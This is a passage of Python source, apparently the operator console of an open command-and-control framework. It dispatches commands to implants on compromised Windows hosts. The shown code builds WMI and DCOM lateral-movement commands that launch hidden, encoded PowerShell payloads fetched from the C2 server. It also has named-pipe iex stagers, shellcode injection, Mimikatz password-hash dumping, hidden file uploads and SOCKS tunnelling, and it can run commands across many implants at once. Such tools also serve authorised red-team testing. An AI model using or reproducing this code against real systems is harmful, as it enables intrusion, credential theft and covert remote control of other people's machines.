        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        params = re.compile("invoke-wmidaisypayload ", re.IGNORECASE)
        params = params.sub("", command)
        cmd = "invoke-wmiexec %s -command \"%s\"" % (params,payload)
        new_task(cmd, randomuri)
      else:
        startup("Need to run createdaisypayload first")

    elif "invoke-wmipayload" in command.lower():
      check_module_loaded("Invoke-WMIExec.ps1", randomuri)
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      params = re.compile("invoke-wmipayload ", re.IGNORECASE)
      params = params.sub("", command)
      cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params,payload)
      new_task(cmd, randomuri)

    # dcom lateral movement

    elif "invoke-dcomproxypayload" in command.lower():
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
        C2[13], C2[11], "", "", C2[19], C2[20],
        C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      p = re.compile(ur'(?<=-target.).*')
      target = re.search(p, command).group()
      pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
      new_task(pscommand, randomuri)

    elif "invoke-dcomdaisypayload" in command.lower():
      daisyname = raw_input("Name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        p = re.compile(ur'(?<=-target.).*')
        target = re.search(p, command).group()
        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
        new_task(pscommand, randomuri)
      else:
        startup("Need to run createdaisypayload first")

    elif "invoke-dcompayload" in command.lower():
      C2 = get_c2server_all()
      newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], "",
          "", "", "", "", C2[19], C2[20],
          C2[21], get_newimplanturl(), PayloadsDirectory)
      payload = newPayload.CreateRawBase()
      p = re.compile(ur'(?<=-target.).*')
      target = re.search(p, command).group()
      pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\Windows\System32\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target,payload)
      new_task(pscommand, randomuri)

    # runas payloads

    elif "invoke-runasdaisypayload" in command.lower():
      daisyname = raw_input("Name required: ")
      if os.path.isfile(("%s%spayload.bat" % (PayloadsDirectory,daisyname))):
        with open("%s%spayload.bat" % (PayloadsDirectory,daisyname), "r") as p: payload = p.read()
        new_task("$proxypayload = \"%s\"" % payload, randomuri)
        check_module_loaded("Invoke-RunAs.ps1", randomuri)
        check_module_loaded("NamedPipeDaisy.ps1", randomuri)
        params = re.compile("invoke-runasdaisypayload ", re.IGNORECASE)
        params = params.sub("", command)
        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSDaisy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
        new_task(pscommand, randomuri)
      else:
        startup("Need to run createdaisypayload first")

    elif "invoke-runasproxypayload" in command.lower():
      C2 = get_c2server_all()
      if C2[11] == "":
        startup("Need to run createproxypayload first")
      else:
        newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
            C2[13], C2[11], "", "", C2[19], C2[20],
            C2[21], "%s?p" % get_newimplanturl(), PayloadsDirectory)
        payload = newPayload.CreateRawBase()
        proxyvar = "$proxypayload = \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % payload
        new_task(proxyvar, randomuri)
        check_module_loaded("Invoke-RunAs.ps1", randomuri)
        check_module_loaded("NamedPipeProxy.ps1", randomuri)
        params = re.compile("invoke-runasproxypayload ", re.IGNORECASE)
        params = params.sub("", command)
        pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
        pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
        new_task(pscommand, randomuri)

    elif "invoke-runaspayload" in command.lower():
      check_module_loaded("Invoke-RunAs.ps1", randomuri)
      check_module_loaded("NamedPipe.ps1", randomuri)
      params = re.compile("invoke-runaspayload ", re.IGNORECASE)
      params = params.sub("", command)
      pipe = "add-Type -assembly System.Core; $pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); $pi.Connect(); $pr = new-object System.IO.StreamReader($pi); iex $pr.ReadLine();"
      pscommand = "invoke-runas %s -command C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -Args \" -e %s\"" % (params,base64.b64encode(pipe.encode('UTF-16LE')))
      new_task(pscommand, randomuri)

    elif command.lower() == "help" or command == "?" or command.lower() == "help ":
      print (posh_help)
    elif command.lower() == "help 1":
      print (posh_help1)
    elif command.lower() == "help 2":
      print (posh_help2)
    elif command.lower() == "help 3":
      print (posh_help3)
    elif command.lower() == "help 4":
      print (posh_help4)
    elif command.lower() == "help 5":
      print (posh_help5)
    elif command.lower() == "help 6":
      print (posh_help6)
    elif command.lower() == "help 7":
      print (posh_help7)
    elif command.lower() == "help 8":
      print (posh_help8)


    elif "get-pid" in command.lower():
      pid = get_implantdetails(randomuri)
      print (pid[8])

    elif "upload-file" in command.lower():
      source = ""
      destination = ""
      s = ""
      nothidden = False
      if command.strip().lower() == "upload-file":
        source = readfile_with_completion("Location of file to upload: ")
        while not os.path.isfile(source):
          print("File does not exist: %s" % source)
          source = readfile_with_completion("Location of file to upload: ")
        destination = raw_input("Location to upload to: ")
      else:
        args = argp(command)
        source = args.source
        destination = args.destination
        nothidden = args.nothidden
      try:
        with open(source, "rb") as source_file:
          s = source_file.read()
        if s:
          sourceb64 = base64.b64encode(s)
          destination = destination.replace("\\","\\\\")
          print ("")
          print ("Uploading %s to %s" % (source, destination))
          if (nothidden):
            uploadcommand = "Upload-File -Destination \"%s\" -NotHidden %s -Base64 %s" % (destination, nothidden, sourceb64)
          else:
            uploadcommand = "Upload-File -Destination \"%s\" -Base64 %s" % (destination, sourceb64)
          new_task(uploadcommand, randomuri)
        else:
          print("Source file could not be read or was empty")
      except Exception as e:
        print ("Error with source file: %s" % e   )
        traceback.print_exc()

    elif "kill-implant" in command.lower() or "exit" in command.lower():
      impid = get_implantdetails(randomuri)
      ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
      if ri.lower() == "n":
        print ("Implant not terminated")
      if ri == "":
        new_task("exit", randomuri)
        kill_implant(randomuri)
      if ri.lower() == "y":
        new_task("exit", randomuri)
        kill_implant(randomuri)

    elif "unhide-implant" in command.lower():
      unhide_implant(randomuri)

    elif "hide-implant" in command.lower():
      kill_implant(randomuri)

    elif "migrate" in command.lower():
      params = re.compile("migrate", re.IGNORECASE)
      params = params.sub("", command)
      migrate(randomuri, params)

    elif "loadmoduleforce" in command.lower():
      params = re.compile("loadmoduleforce ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri, force=True)

    elif "loadmodule" in command.lower():
      params = re.compile("loadmodule ", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded(params, randomuri)

    elif "invoke-daisychain" in command.lower():
      check_module_loaded("Invoke-DaisyChain.ps1", randomuri)
      urls = get_allurls()
      new_task("%s -URLs '%s'" % (command,urls), randomuri)
      print ("Now use createdaisypayload")

    elif "inject-shellcode" in command.lower():
    #elif (command.lower() == "inject-shellcode") or (command.lower() == "inject-shellcode "):
      params = re.compile("inject-shellcode", re.IGNORECASE)
      params = params.sub("", command)
      check_module_loaded("Inject-Shellcode.ps1", randomuri)
      readline.set_completer(filecomplete)
      path = raw_input("Location of shellcode file: ")
      t = tabCompleter()
      t.createListCompleter(COMMANDS)
      readline.set_completer(t.listCompleter)
      try:
        shellcodefile = load_file(path)
        if shellcodefile != None:
          arch = "64"
          new_task("$Shellcode%s=\"%s\"" % (arch,base64.b64encode(shellcodefile)), randomuri)
          new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), randomuri)
      except Exception as e:
        print ("Error loading file: %s" % e)

    elif "listmodules" in command.lower():
      print (os.listdir("%s/Modules/" % POSHDIR))

    elif "modulesloaded" in command.lower():
      ml = get_implantdetails(randomuri)
      print (ml[14])

    elif (command.lower() == "ps") or (command.lower() == "ps "):
      new_task("get-processlist", randomuri)

    elif (command.lower() == "hashdump") or (command.lower() == "hashdump "):
      check_module_loaded("Invoke-Mimikatz.ps1", randomuri)
      new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", randomuri)

    elif (command.lower() == "sharpsocks") or (command.lower() == "sharpsocks "):
      check_module_loaded("SharpSocks.ps1", randomuri)
      import string
      from random import choice
      allchar = string.ascii_letters
      channel = "".join(choice(allchar) for x in range(25))
      sharpkey = gen_key()
      sharpurls = get_sharpurls()
      sharpurl = select_item("HostnameIP", "C2Server")
      new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), randomuri)
      print ("git clone https://github.com/nettitude/SharpSocks.git")
      print ("SharpSocksServerTestApp.exe -c %s -k %s -l http://IPADDRESS:8080" % (channel,sharpkey))

    elif (command.lower() == "history") or command.lower() == "history ":
      startup(get_history())

    elif "reversedns" in command.lower():
      params = re.compile("reversedns ", re.IGNORECASE)
      params = params.sub("", command)
      new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, randomuri)

    elif "createdaisypayload" in command.lower():
      createdaisypayload()

    elif "createproxypayload" in command.lower():
      createproxypayload()

    elif "createnewpayload" in command.lower():
      createproxypayload()

    else:
      if command:
        new_task(command, randomuri)
      return
    return

def commandloop(implant_id):
  while(True):
    try:
      implant_id_orig = implant_id
      t = tabCompleter()
      t.createListCompleter(COMMANDS)
      readline.set_completer_delims('\t')
      readline.parse_and_bind("tab: complete")
      readline.set_completer(t.listCompleter)
      if ("-" in implant_id.lower()) or ("all" in implant_id.lower()) or ("," in implant_id.lower()):
        print (Colours.GREEN)
        command = raw_input("%s> " % (implant_id))
      else:
        hostname = get_hostdetails(implant_id)
        if hostname[15] == 'OSX':
          t.createListCompleter(UXCOMMANDS)
          readline.set_completer_delims('\t')
          readline.parse_and_bind("tab: complete")
          readline.set_completer(t.listCompleter)
        if hostname[15] == 'C#':
          t.createListCompleter(SHARPCOMMANDS)
          readline.set_completer_delims('\t')
          readline.parse_and_bind("tab: complete")
          readline.set_completer(t.listCompleter)
        print (Colours.GREEN)
        print ("%s @ %s (PID:%s)" % (hostname[11],hostname[3],hostname[8]))
        command = raw_input("%s> " % (implant_id))

      # if "all" run through all implants get_implants()
      if implant_id.lower() == "all":
        if command == "back":
          startup()
        implant_split = get_implants()
        if implant_split:
          for implant_id in implant_split:
            runcommand(command, implant_id[1])
      # if "seperated list" against single uri
      elif "," in implant_id:
        implant_split = implant_id.split(",")
        for implant_id in implant_split:
          implant_id = get_randomuri(implant_id)
          runcommand(command, implant_id)
      # if "range" against single uri
      elif "-" in implant_id:
        implant_split = implant_id.split("-")
        for implant_id in range(int(implant_split[0]), int(implant_split[1])+1):
          try:
            implant_id = get_randomuri(implant_id)
            runcommand(command, implant_id)
          except Exception as e:
            print ("Unknown ImplantID")
      # else run against single uri
      else:
        implant_id = get_randomuri(implant_id)
        runcommand(command, implant_id)

      # then run back around
      commandloop(implant_id_orig)

    except Exception as e:
      print (Colours.RED)
      print ("Error running against the selected implant ID, ensure you have typed the correct information")
      #print Colours.END
      #traceback.print_exc()
      #print "Error: %s" % e
      # remove the following comment when publishing to live
      time.sleep(1)
      startup()

if __name__ == '__main__':
  original_sigint = signal.getsignal(signal.SIGINT)
  signal.signal(signal.SIGINT, catch_exit)
  startup()
